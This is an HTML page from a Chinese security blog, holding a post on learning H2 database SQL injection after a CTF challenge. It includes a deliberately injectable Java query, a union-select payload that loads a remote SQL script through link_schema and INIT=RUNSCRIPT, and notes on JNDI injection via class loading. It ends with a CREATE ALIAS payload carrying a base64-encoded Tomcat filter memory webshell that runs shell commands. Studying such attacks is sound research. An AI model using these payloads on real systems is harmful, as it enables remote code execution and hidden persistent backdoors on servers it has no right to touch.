@@ -1,0 +1,438 @@
+<!DOCTYPE html>
+<html lang="zh">
+<head>
+    <!-- Google tag (gtag.js) -->
+    <script async src="https://www.googletagmanager.com/gtag/js?id=G-DT27XM4C8J"></script>
+    <script>
+    window.dataLayer = window.dataLayer || [];
+    function gtag(){dataLayer.push(arguments);}
+    gtag('js', new Date());
+
+    gtag('config', 'G-DT27XM4C8J');
+    </script>
+    
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="renderer" content="webkit">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">
+    <title>
+        unknown&#39;s Blog
+    </title>
+    
+<link rel="stylesheet" href="/libs/highlight/styles/monokai-sublime.css">
+
+    
+<link rel="stylesheet" href="/libs/font-awesome/css/font-awesome.min.css">
+
+    
+<link rel="stylesheet" href="/css/style.css">
+
+<meta name="generator" content="Hexo 6.3.0"></head>
+
+
+
+<body id="bodyx">
+    <div class="hd logodiv" style="margin-top: 3%;">
+    <!-- <img src="/img/logo.png" class="logopng"> -->
+    <p class="logot">
+        <a href="/" style="color: #4f4646;text-decoration: none;">
+            unknown&#39;s blog 
+        </a>
+    </p>
+</div>
+<div class="hd">
+    <ol class="breadcrumb">
+        
+            <li><a class="ba" href="/tech">Tech</a></li>
+        
+            <li><a class="ba" href="/life">Life</a></li>
+        
+            <li><a class="ba" href="/essay">Essay</a></li>
+        
+            <li><a class="ba" href="/links">Friends</a></li>
+        
+            <li><a class="ba" target="_blank" rel="noopener" href="https://running.unk.org.cn/">Running</a></li>
+        
+            <li><a class="ba" href="/about">About</a></li>
+        
+            <li><a class="ba" href="/subscribe">Subscribe</a></li>
+        
+    </ol>
+    <hr class="breadcrumbhr">
+</div>
+
+    
+<div class="hd posts">
+
+    <!-- <a href="/index.html">
+        <i class="fa fa-reply replay-btn" aria-hidden="true"></i>
+    </a> -->
+    <div class="post-title">
+        <p>
+            h2注入系统学习
+        </p>
+        <!-- <hr> -->
+    </div>
+    <div class="post-content">
+        <p>文章首发先知社区：<a target="_blank" rel="noopener" href="https://xz.aliyun.com/news/16831">https://xz.aliyun.com/news/16831</a></p>
+<hr>
+<p>起初是在N1 Junior 2025 上面碰到一题，考点是h2的sql注入。由于之前没有见过，趁此机会系统学习一番</p>
+<p><img src="https://unk-blog-image.oss-cn-shenzhen.aliyuncs.com/images/h2-inject/image-20250211110108118.png" alt="image-20250211110108118.png"></p>
+<h1 id="实验代码"><a href="#实验代码" class="headerlink" title="实验代码"></a>实验代码</h1><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">public class H2Inject &#123;</span><br><span class="line">    public static void main(String[] args) throws Exception&#123;</span><br><span class="line"></span><br><span class="line">        JdbcDataSource dataSource = new JdbcDataSource();</span><br><span class="line">        dataSource.setURL(&quot;jdbc:h2:mem:testdb;DB_CLOSE_DELAY=-1&quot;);</span><br><span class="line">        dataSource.setUser(&quot;asd&quot;);</span><br><span class="line">        dataSource.setPassword(&quot;&quot;);</span><br><span class="line"></span><br><span class="line">        Connection connection = dataSource.getConnection();</span><br><span class="line"></span><br><span class="line">        Statement statement = connection.createStatement();</span><br><span class="line">        statement.execute(&quot;CREATE TABLE IF NOT EXISTS users (id INT PRIMARY KEY, username VARCHAR(255) NOT NULL, password VARCHAR(255) NOT NULL);&quot;);</span><br><span class="line">        statement.executeUpdate(&quot;INSERT INTO users (id, username, password) VALUES (1, &#x27;admin&#x27;, &#x27;admin&#x27;);&quot;);</span><br><span class="line"></span><br><span class="line">        String username = &quot;admin&quot;;</span><br><span class="line"></span><br><span class="line">        statement.executeQuery(String.format(&quot;select * from users where username = &#x27;%s&#x27; &quot;,username));</span><br><span class="line">        ResultSet resultSet = statement.getResultSet();</span><br><span class="line"></span><br><span class="line">        boolean next = resultSet.next();</span><br><span class="line">        while(next)&#123;</span><br><span class="line">            String string1 = resultSet.getString(1);</span><br><span class="line">            String string2 = resultSet.getString(2);</span><br><span class="line">            String string3 = resultSet.getString(3);</span><br><span class="line">            System.out.println(string1);</span><br><span class="line">            System.out.println(string2);</span><br><span class="line">            System.out.println(string3);</span><br><span class="line">            next = resultSet.next();</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+
+
+<h1 id="读文件"><a href="#读文件" class="headerlink" title="读文件"></a>读文件</h1><p>翻阅官方文档：</p>
+<p><img src="https://unk-blog-image.oss-cn-shenzhen.aliyuncs.com/images/h2-inject/image-20250211110834738.png" alt="image-20250211110834738.png"></p>
+<p>只输入文件名一个参数，效果也是一样的。</p>
+<p><img src="https://unk-blog-image.oss-cn-shenzhen.aliyuncs.com/images/h2-inject/image-20250211111217145.png" alt="image-20250211111217145.png"></p>
+<h1 id="写文件"><a href="#写文件" class="headerlink" title="写文件"></a>写文件</h1><p><img src="https://unk-blog-image.oss-cn-shenzhen.aliyuncs.com/images/h2-inject/image-20250211111325674.png" alt="image-20250211111325674.png"></p>
+<p><img src="https://unk-blog-image.oss-cn-shenzhen.aliyuncs.com/images/h2-inject/image-20250211111514480.png" alt="image-20250211111514480.png"></p>
+<p><img src="https://unk-blog-image.oss-cn-shenzhen.aliyuncs.com/images/h2-inject/image-20250211111610271.png" alt="image-20250211111610271.png"></p>
+<p>文件是成功写入的，为什么会报错呢？</p>
+<blockquote>
+<p>Caused by: java.lang.NumberFormatException: For input string: “admin”</p>
+</blockquote>
+<p>原因就是，获取结果的时候，先看第一行对应列是什么数据类型，决定了后面几行的数据类型。</p>
+<p>file_write的返回结果是数字，所以决定了该列是数字类型，所以查询出来的”admin”转换成数字的时候就报错。</p>
+<p>不过有个地方不明白，为什么union select后面的结果会到第一行去？</p>
+<h1 id="发起jdbc连接"><a href="#发起jdbc连接" class="headerlink" title="发起jdbc连接"></a>发起jdbc连接</h1><p><img src="https://unk-blog-image.oss-cn-shenzhen.aliyuncs.com/images/h2-inject/image-20250211111950707.png" alt="image-20250211111950707.png"></p>
+<p>link_schema是表函数，接在from的后面。</p>
+<p>既然可以使用jdbc连接，那么就去连接h2数据库，并且设置INIT脚本，执行远程sql代码。</p>
+<p>利用方式：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">String username = &quot;admin&#x27; union select 1,&#x27;1&#x27;,&#x27;1&#x27; from link_schema(&#x27;TEST2&#x27;, &#x27;&#x27;, &#x27;jdbc:h2:mem:testdb1;TRACE_LEVEL_SYSTEM_OUT=3;INIT=RUNSCRIPT FROM &#x27;&#x27;http://127.0.0.1:8989/hello.sql&#x27;&#x27;&#x27;, &#x27;sa&#x27;, &#x27;sa&#x27;, &#x27;PUBLIC&#x27;)--&quot;;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>这里存在引号嵌套，需要进行转义，有几个注意点：</p>
+<ol>
+<li>h2中，单引号括起来的是字符串，双引号括起来的表示列名。</li>
+<li>单引号转义，不用反斜杠，而是用2个单引号来表示一个单引号</li>
+</ol>
+<p><img src="https://unk-blog-image.oss-cn-shenzhen.aliyuncs.com/images/h2-inject/image-20250211112349550.png" alt="image-20250211112349550.png"></p>
+<p>假设题目不出网，则可以先将sql脚本写入到目标机器，再发起jdbc连接。</p>
+<h1 id="JNDI注入"><a href="#JNDI注入" class="headerlink" title="JNDI注入"></a>JNDI注入</h1><p>我们分析link_schema函数的底层代码实现</p>
+<p>看LinkSchemaFunction的getValue方法</p>
+<p>后续会进入JdbcUtils的getConnection，注意driver和url两个参数</p>
+<p><img src="https://unk-blog-image.oss-cn-shenzhen.aliyuncs.com/images/h2-inject/image-20250211113113365.png" alt="image-20250211113113365.png"></p>
+<p>一直跟进，到下面的位置。</p>
+<p>有2处利用，第一处，如果url以jdbc:h2开头，则发起jdbc连接，否则对driver进行类加载</p>
+<p><img src="https://unk-blog-image.oss-cn-shenzhen.aliyuncs.com/images/h2-inject/image-20250211113137429.png" alt="image-20250211113137429.png"></p>
+<p>跟进loadUserClass</p>
+<p><img src="https://unk-blog-image.oss-cn-shenzhen.aliyuncs.com/images/h2-inject/image-20250211113335074.png" alt="image-20250211113335074.png"></p>
+<p>首先检查allowedClassNames，这里默认是*，也就是所有类都allowed。</p>
+<p><img src="https://unk-blog-image.oss-cn-shenzhen.aliyuncs.com/images/h2-inject/image-20250211113350150.png" alt="image-20250211113350150.png"></p>
+<p>后面就是用Class.forName进行类加载。</p>
+<p>类加载完成后，回到getConnection。</p>
+<p><img src="https://unk-blog-image.oss-cn-shenzhen.aliyuncs.com/images/h2-inject/image-20250211113427091.png" alt="image-20250211113427091.png"></p>
+<p>如果加载的类是驱动，则进行newInstance，如果是Context，则发起jndi连接。</p>
+<p>那么直接加载javax.naming.InitialContext，打jndi。</p>
+<p>可惜的是，高版本的h2依赖，添加了jndi限制，url必须以java:开头。</p>
+<p>查看源码发现，2.1.x全版本都有限制，2.0.x &lt; 2.0.206 无限制。</p>
+<p><img src="https://unk-blog-image.oss-cn-shenzhen.aliyuncs.com/images/h2-inject/image-20250211115048289.png" alt="image-20250211115048289.png"></p>
+<h1 id="打内存马"><a href="#打内存马" class="headerlink" title="打内存马"></a>打内存马</h1><p>继续发散， 假如题目不出网，无法弹shell，那就需要内存马，方便执行命令。</p>
+<p>直接用Filter型内存马，首先写入到目标机器，再加载。</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">CREATE ALIAS EXEC AS &#x27;</span><br><span class="line"></span><br><span class="line">    void e(String cmd) throws Exception&#123;</span><br><span class="line">        String evilClassBase64 = &quot;yv66vgAAADQBTQoAIQC5CgC6ALsKALwAvQoAvAC+CgC6AL8KACEAwAoAwQC7BwDCCgAhAMMKAEgAxAoAIwDFCgDBAMYKAEkAxwoAyADJCgDIAMoHAMsIAH8KAEgAzAcAzQoAEwDOBwDPCADQBwDRCgAXAMcKABcA0ggA0woAFwDUBwDVCgAcAMcKABwA0goAHADWBwDXBwDYBwDZBwDaCgBIANsIAIoHANwKACYA3QoAFQDeCgAVAN8IAOALAOEA4gsA4wDkCADlCADmCgDnAOgKADQA6QgA6goANADrBwDsBwDtCADuCADvCgAzAPAIAPEIAPIHAPMKADMA9AoA9QD2CgA6APcIAPgKADoA+QoAOgD6CgA6APsKADoA/AoA/QD+CgD9AP8KAP0A/AsBAAEBBwECBwEDBwEEBwEFAQAVY3JlYXRlV2l0aENvbnN0cnVjdG9yAQBbKExqYXZhL2xhbmcvQ2xhc3M7TGphdmEvbGFuZy9DbGFzcztbTGphdmEvbGFuZy9DbGFzcztbTGphdmEvbGFuZy9PYmplY3Q7KUxqYXZhL2xhbmcvT2JqZWN0OwEABENvZGUBAA9MaW5lTnVtYmVyVGFibGUBABJMb2NhbFZhcmlhYmxlVGFibGUBABJjbGFzc1RvSW5zdGFudGlhdGUBABFMamF2YS9sYW5nL0NsYXNzOwEAEGNvbnN0cnVjdG9yQ2xhc3MBAAxjb25zQXJnVHlwZXMBABJbTGphdmEvbGFuZy9DbGFzczsBAAhjb25zQXJncwEAE1tMamF2YS9sYW5nL09iamVjdDsBAAdvYmpDb25zAQAfTGphdmEvbGFuZy9yZWZsZWN0L0NvbnN0cnVjdG9yOwEAAnNjAQAWTG9jYWxWYXJpYWJsZVR5cGVUYWJsZQEAFkxqYXZhL2xhbmcvQ2xhc3M8VFQ7PjsBABdMamF2YS9sYW5nL0NsYXNzPC1UVDs+OwEAFVtMamF2YS9sYW5nL0NsYXNzPCo+OwEAJUxqYXZhL2xhbmcvcmVmbGVjdC9Db25zdHJ1Y3RvcjwtVFQ7PjsBACJMamF2YS9sYW5nL3JlZmxlY3QvQ29uc3RydWN0b3I8Kj47AQAKRXhjZXB0aW9ucwEACVNpZ25hdHVyZQEAcDxUOkxqYXZhL2xhbmcvT2JqZWN0Oz4oTGphdmEvbGFuZy9DbGFzczxUVDs+O0xqYXZhL2xhbmcvQ2xhc3M8LVRUOz47W0xqYXZhL2xhbmcvQ2xhc3M8Kj47W0xqYXZhL2xhbmcvT2JqZWN0OylUVDsBAAhnZXRGaWVsZAEAPihMamF2YS9sYW5nL0NsYXNzO0xqYXZhL2xhbmcvU3RyaW5nOylMamF2YS9sYW5nL3JlZmxlY3QvRmllbGQ7AQACZXgBACBMamF2YS9sYW5nL05vU3VjaEZpZWxkRXhjZXB0aW9uOwEABWNsYXp6AQAJZmllbGROYW1lAQASTGphdmEvbGFuZy9TdHJpbmc7AQAFZmllbGQBABlMamF2YS9sYW5nL3JlZmxlY3QvRmllbGQ7AQAUTGphdmEvbGFuZy9DbGFzczwqPjsBAA1TdGFja01hcFRhYmxlBwDYBwDtBwEGBwDCAQBBKExqYXZhL2xhbmcvQ2xhc3M8Kj47TGphdmEvbGFuZy9TdHJpbmc7KUxqYXZhL2xhbmcvcmVmbGVjdC9GaWVsZDsBAA1nZXRGaWVsZFZhbHVlAQA4KExqYXZhL2xhbmcvT2JqZWN0O0xqYXZhL2xhbmcvU3RyaW5nOylMamF2YS9sYW5nL09iamVjdDsBAANvYmoBABJMamF2YS9sYW5nL09iamVjdDsBAAlmaWVsZG5hbWUBAAFvAQAGPGluaXQ+AQADKClWAQAEdGhpcwEADUxGaWx0ZXJTaGVsbDsBABV3ZWJhcHBDbGFzc0xvYWRlckJhc2UBADJMb3JnL2FwYWNoZS9jYXRhbGluYS9sb2FkZXIvV2ViYXBwQ2xhc3NMb2FkZXJCYXNlOwEACXJlc291cmNlcwEAL0xvcmcvYXBhY2hlL2NhdGFsaW5hL3dlYnJlc291cmNlcy9TdGFuZGFyZFJvb3Q7AQAHY29udGV4dAEAKkxvcmcvYXBhY2hlL2NhdGFsaW5hL2NvcmUvU3RhbmRhcmRDb250ZXh0OwEACmZpbHRlck5hbWUBAAlmaWx0ZXJNYXABADFMb3JnL2FwYWNoZS90b21jYXQvdXRpbC9kZXNjcmlwdG9yL3dlYi9GaWx0ZXJNYXA7AQAJZmlsdGVyRGVmAQAxTG9yZy9hcGFjaGUvdG9tY2F0L3V0aWwvZGVzY3JpcHRvci93ZWIvRmlsdGVyRGVmOwEAF2FwcGxpY2F0aW9uRmlsdGVyQ29uZmlnAQAyTG9yZy9hcGFjaGUvY2F0YWxpbmEvY29yZS9BcHBsaWNhdGlvbkZpbHRlckNvbmZpZzsBAA1maWx0ZXJDb25maWdzAQATTGphdmEvdXRpbC9IYXNoTWFwOwEAWUxqYXZhL3V0aWwvSGFzaE1hcDxMamF2YS9sYW5nL1N0cmluZztMb3JnL2FwYWNoZS9jYXRhbGluYS9jb3JlL0FwcGxpY2F0aW9uRmlsdGVyQ29uZmlnOz47AQAIZG9GaWx0ZXIBAFsoTGphdmF4L3NlcnZsZXQvU2VydmxldFJlcXVlc3Q7TGphdmF4L3NlcnZsZXQvU2VydmxldFJlc3BvbnNlO0xqYXZheC9zZXJ2bGV0L0ZpbHRlckNoYWluOylWAQABcAEAGkxqYXZhL2xhbmcvUHJvY2Vzc0J1aWxkZXI7AQAGd3JpdGVyAQAVTGphdmEvaW8vUHJpbnRXcml0ZXI7AQABYwEAE0xqYXZhL3V0aWwvU2Nhbm5lcjsBAARhcmcwAQAHcmVxdWVzdAEAHkxqYXZheC9zZXJ2bGV0L1NlcnZsZXRSZXF1ZXN0OwEACHJlc3BvbnNlAQAfTGphdmF4L3NlcnZsZXQvU2VydmxldFJlc3BvbnNlOwEABWNoYWluAQAbTGphdmF4L3NlcnZsZXQvRmlsdGVyQ2hhaW47BwEHBwDsBwDzBwEDBwEIBwEJBwEKBwECBwELBwEMAQAJdHJhbnNmb3JtAQByKExjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvRE9NO1tMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9zZXJpYWxpemVyL1NlcmlhbGl6YXRpb25IYW5kbGVyOylWAQAIZG9jdW1lbnQBAC1MY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL0RPTTsBAAhoYW5kbGVycwEAQltMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9zZXJpYWxpemVyL1NlcmlhbGl6YXRpb25IYW5kbGVyOwcBDQEApihMY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL0RPTTtMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9kdG0vRFRNQXhpc0l0ZXJhdG9yO0xjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL3NlcmlhbGl6ZXIvU2VyaWFsaXphdGlvbkhhbmRsZXI7KVYBAAhpdGVyYXRvcgEANUxjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL2R0bS9EVE1BeGlzSXRlcmF0b3I7AQAHaGFuZGxlcgEAQUxjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL3NlcmlhbGl6ZXIvU2VyaWFsaXphdGlvbkhhbmRsZXI7AQAEaW5pdAEAHyhMamF2YXgvc2VydmxldC9GaWx0ZXJDb25maWc7KVYBAAxmaWx0ZXJDb25maWcBABxMamF2YXgvc2VydmxldC9GaWx0ZXJDb25maWc7AQAHZGVzdHJveQEAClNvdXJjZUZpbGUBABBGaWx0ZXJTaGVsbC5qYXZhDAEOAQ8HARAMAREBEgcBEwwBFAEVDAEWARcMARgBGQwBGgEbBwEGAQAeamF2YS9sYW5nL05vU3VjaEZpZWxkRXhjZXB0aW9uDAEcAR0MAGMAZAwBHgEdDAEfASAMAHkAegcBIQwBIgEjDAEkASUBADBvcmcvYXBhY2hlL2NhdGFsaW5hL2xvYWRlci9XZWJhcHBDbGFzc0xvYWRlckJhc2UMAHMAdAEALW9yZy9hcGFjaGUvY2F0YWxpbmEvd2VicmVzb3VyY2VzL1N0YW5kYXJkUm9vdAwBJgEnAQAob3JnL2FwYWNoZS9jYXRhbGluYS9jb3JlL1N0YW5kYXJkQ29udGV4dAEABWZmZmZmAQAvb3JnL2FwYWNoZS90b21jYXQvdXRpbC9kZXNjcmlwdG9yL3dlYi9GaWx0ZXJNYXAMASgBKQEAAi8qDAEqASkBAC9vcmcvYXBhY2hlL3RvbWNhdC91dGlsL2Rlc2NyaXB0b3Ivd2ViL0ZpbHRlckRlZgwBKwEsAQAwb3JnL2FwYWNoZS9jYXRhbGluYS9jb3JlL0FwcGxpY2F0aW9uRmlsdGVyQ29uZmlnAQAPamF2YS9sYW5nL0NsYXNzAQAbb3JnL2FwYWNoZS9jYXRhbGluYS9Db250ZXh0AQAQamF2YS9sYW5nL09iamVjdAwASwBMAQARamF2YS91dGlsL0hhc2hNYXAMAS0BLgwBLwEwDAExATIBAANjbWQHAQgMATMBNAcBCQwBNQE2AQAAAQAHb3MubmFtZQcBNwwBOAE0DAE5AToBAAN3aW4MATsBPAEAGGphdmEvbGFuZy9Qcm9jZXNzQnVpbGRlcgEAEGphdmEvbGFuZy9TdHJpbmcBAAdjbWQuZXhlAQACL2MMAHkBPQEABy9iaW4vc2gBAAItYwEAEWphdmEvdXRpbC9TY2FubmVyDAE+AT8HAUAMAUEBQgwAeQFDAQACXEEMAUQBRQwBRgFHDAFIAToMAUkAegcBBwwBSgEpDAFLAHoHAQoMAI0BTAEAE2phdmEvbGFuZy9FeGNlcHRpb24BAAtGaWx0ZXJTaGVsbAEAQGNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9ydW50aW1lL0Fic3RyYWN0VHJhbnNsZXQBABRqYXZheC9zZXJ2bGV0L0ZpbHRlcgEAF2phdmEvbGFuZy9yZWZsZWN0L0ZpZWxkAQATamF2YS9pby9QcmludFdyaXRlcgEAHGphdmF4L3NlcnZsZXQvU2VydmxldFJlcXVlc3QBAB1qYXZheC9zZXJ2bGV0L1NlcnZsZXRSZXNwb25zZQEAGWphdmF4L3NlcnZsZXQvRmlsdGVyQ2hhaW4BABNqYXZhL2lvL0lPRXhjZXB0aW9uAQAeamF2YXgvc2VydmxldC9TZXJ2bGV0RXhjZXB0aW9uAQA5Y29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL1RyYW5zbGV0RXhjZXB0aW9uAQAWZ2V0RGVjbGFyZWRDb25zdHJ1Y3RvcgEAMyhbTGphdmEvbGFuZy9DbGFzczspTGphdmEvbGFuZy9yZWZsZWN0L0NvbnN0cnVjdG9yOwEAHWphdmEvbGFuZy9yZWZsZWN0L0NvbnN0cnVjdG9yAQANc2V0QWNjZXNzaWJsZQEABChaKVYBAB1zdW4vcmVmbGVjdC9SZWZsZWN0aW9uRmFjdG9yeQEAFGdldFJlZmxlY3Rpb25GYWN0b3J5AQAhKClMc3VuL3JlZmxlY3QvUmVmbGVjdGlvbkZhY3Rvcnk7AQAebmV3Q29uc3RydWN0b3JGb3JTZXJpYWxpemF0aW9uAQBRKExqYXZhL2xhbmcvQ2xhc3M7TGphdmEvbGFuZy9yZWZsZWN0L0NvbnN0cnVjdG9yOylMamF2YS9sYW5nL3JlZmxlY3QvQ29uc3RydWN0b3I7AQALbmV3SW5zdGFuY2UBACcoW0xqYXZhL2xhbmcvT2JqZWN0OylMamF2YS9sYW5nL09iamVjdDsBABBnZXREZWNsYXJlZEZpZWxkAQAtKExqYXZhL2xhbmcvU3RyaW5nOylMamF2YS9sYW5nL3JlZmxlY3QvRmllbGQ7AQANZ2V0U3VwZXJjbGFzcwEAEygpTGphdmEvbGFuZy9DbGFzczsBAAhnZXRDbGFzcwEAA2dldAEAJihMamF2YS9sYW5nL09iamVjdDspTGphdmEvbGFuZy9PYmplY3Q7AQAQamF2YS9sYW5nL1RocmVhZAEADWN1cnJlbnRUaHJlYWQBABQoKUxqYXZhL2xhbmcvVGhyZWFkOwEAFWdldENvbnRleHRDbGFzc0xvYWRlcgEAGSgpTGphdmEvbGFuZy9DbGFzc0xvYWRlcjsBAApnZXRDb250ZXh0AQAfKClMb3JnL2FwYWNoZS9jYXRhbGluYS9Db250ZXh0OwEADXNldEZpbHRlck5hbWUBABUoTGphdmEvbGFuZy9TdHJpbmc7KVYBAA1hZGRVUkxQYXR0ZXJuAQAJc2V0RmlsdGVyAQAZKExqYXZheC9zZXJ2bGV0L0ZpbHRlcjspVgEAA3B1dAEAOChMamF2YS9sYW5nL09iamVjdDtMamF2YS9sYW5nL09iamVjdDspTGphdmEvbGFuZy9PYmplY3Q7AQAMYWRkRmlsdGVyRGVmAQA0KExvcmcvYXBhY2hlL3RvbWNhdC91dGlsL2Rlc2NyaXB0b3Ivd2ViL0ZpbHRlckRlZjspVgEADGFkZEZpbHRlck1hcAEANChMb3JnL2FwYWNoZS90b21jYXQvdXRpbC9kZXNjcmlwdG9yL3dlYi9GaWx0ZXJNYXA7KVYBAAxnZXRQYXJhbWV0ZXIBACYoTGphdmEvbGFuZy9TdHJpbmc7KUxqYXZhL2xhbmcvU3RyaW5nOwEACWdldFdyaXRlcgEAFygpTGphdmEvaW8vUHJpbnRXcml0ZXI7AQAQamF2YS9sYW5nL1N5c3RlbQEAC2dldFByb3BlcnR5AQALdG9Mb3dlckNhc2UBABQoKUxqYXZhL2xhbmcvU3RyaW5nOwEA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&quot;;</span><br><span class="line">        byte[] bytes = java.util.Base64.getDecoder().decode(evilClassBase64);</span><br><span class="line">        java.lang.reflect.Method method = ClassLoader.class.getDeclaredMethod(&quot;defineClass&quot;, String.class, byte[].class, int.class, int.class);</span><br><span class="line">        method.setAccessible(true);</span><br><span class="line">        ((Class)method.invoke(ClassLoader.getSystemClassLoader(), &quot;FilterShell&quot;, bytes, 0, bytes.length)).newInstance();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    &#x27;;</span><br><span class="line">CALL EXEC(&#x27;calc&#x27;);</span><br></pre></td></tr></table></figure>
+
+
+
+<p>测试代码</p>
+<p><img src="https://unk-blog-image.oss-cn-shenzhen.aliyuncs.com/images/h2-inject/image-20250211115546274.png" alt="image-20250211115546274.png"></p>
+<p>打入成功</p>
+<p><img src="https://unk-blog-image.oss-cn-shenzhen.aliyuncs.com/images/h2-inject/image-20250211115620864.png" alt="image-20250211115620864.png"></p>
+
+    </div>
+    
+    <div class="toc-container">
